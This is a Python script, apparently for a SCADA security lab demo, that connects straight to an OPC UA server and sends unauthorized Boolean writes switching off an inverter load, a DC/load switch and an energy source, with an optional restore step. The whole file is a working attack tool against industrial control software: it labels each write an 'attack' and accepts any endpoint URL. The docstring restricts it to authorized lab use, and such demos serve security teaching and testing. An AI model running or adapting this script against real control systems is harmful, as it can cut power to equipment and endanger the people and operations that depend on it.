#!/usr/bin/env python3
"""Controlled OPC UA command-write demo for the SCADA dashboard platform.

This bypasses the Flask dashboard entirely and writes directly to the OPC UA server.
Use only in your authorized lab/demo environment.
"""

import argparse
import time
from opcua import Client, ua

DEFAULT_OPC_URL = "opc.tcp://127.0.0.1:4840/freeopcua/server/"
NS_URI = "http://scada.control"

NODE_PATHS = {
    "load_sw": ["Dashboard_Interface", "LOAD", "load_sw"],
    "source_sw": ["Dashboard_Interface", "ENERGY SOURCE", "source_sw"],
    "batt_sw": ["Dashboard_Interface", "BATTERY", "batt_sw"],
    "inv_sw": ["Dashboard_Interface", "LOAD INVERTER", "inv_sw"],
}

DEMO_SEQUENCE = [
    ("inv_sw", False, "inverter load OFF"),
    ("load_sw", False, "DC/load switch OFF"),
    ("source_sw", False, "energy source OFF"),
]

RESTORE_SEQUENCE = [
    ("source_sw", True, "energy source ON"),
    ("load_sw", True, "DC/load switch ON"),
    ("inv_sw", True, "inverter load ON"),
    ("batt_sw", True, "battery ON"),
]


def q(nsidx, name):
    return f"{nsidx}:{name}"


def get_node(client, nsidx, logical_name):
    path = ["0:Objects"] + [q(nsidx, item) for item in NODE_PATHS[logical_name]]
    return client.nodes.root.get_child(path)


def write_bool(node, value):
    data_value = ua.DataValue(ua.Variant(bool(value), ua.VariantType.Boolean))
    node.set_attribute(ua.AttributeIds.Value, data_value)


def read_all(nodes):
    state = {}
    for name, node in nodes.items():
        try:
            state[name] = node.get_value()
        except Exception as e:
            state[name] = f"READ FAILED: {e}"
    return state


def print_state(title, state):
    print(f"\n{title}")
    for name in ["load_sw", "source_sw", "batt_sw", "inv_sw"]:
        print(f"  {name:10s} = {state.get(name)}")


def main():
    parser = argparse.ArgumentParser(description="OPC UA direct command-write demo")
    parser.add_argument("--url", default=DEFAULT_OPC_URL, help="OPC UA endpoint URL")
    parser.add_argument("--node", choices=NODE_PATHS.keys(), help="Write one node instead of running the full demo sequence")
    parser.add_argument("--value", choices=["on", "off", "true", "false", "1", "0"], help="Value for --node")
    parser.add_argument("--restore", action="store_true", help="Restore all switches to ON after the demo")
    parser.add_argument("--delay", type=float, default=2.0, help="Delay between writes during the demo sequence")
    args = parser.parse_args()

    print(f"Connecting directly to OPC UA server: {args.url}")
    client = Client(args.url)

    try:
        client.connect()
        nsidx = client.get_namespace_index(NS_URI)
        print(f"Connected. Namespace index = {nsidx}")

        nodes = {name: get_node(client, nsidx, name) for name in NODE_PATHS}
        print_state("Before attack:", read_all(nodes))

        if args.node:
            if args.value is None:
                raise SystemExit("--value is required when using --node")
            value = args.value.lower() in ["on", "true", "1"]
            sequence = [(args.node, value, f"{args.node} -> {value}")]
        else:
            sequence = DEMO_SEQUENCE

        print("\nSending unauthorized OPC UA write commands...")
        for node_name, value, label in sequence:
            print(f"  attack: {label}")
            write_bool(nodes[node_name], value)
            time.sleep(args.delay)

        print_state("After attack:", read_all(nodes))

        if args.restore:
            print("\nRestoring switches to ON...")
            for node_name, value, label in RESTORE_SEQUENCE:
                print(f"  restore: {label}")
                write_bool(nodes[node_name], value)
                time.sleep(0.5)
            print_state("After restore:", read_all(nodes))

        print("\nAttack demo complete. Watch the dashboard LEDs and /data output.")

    finally:
        try:
            client.disconnect()
        except Exception:
            pass


if __name__ == "__main__":
    main()
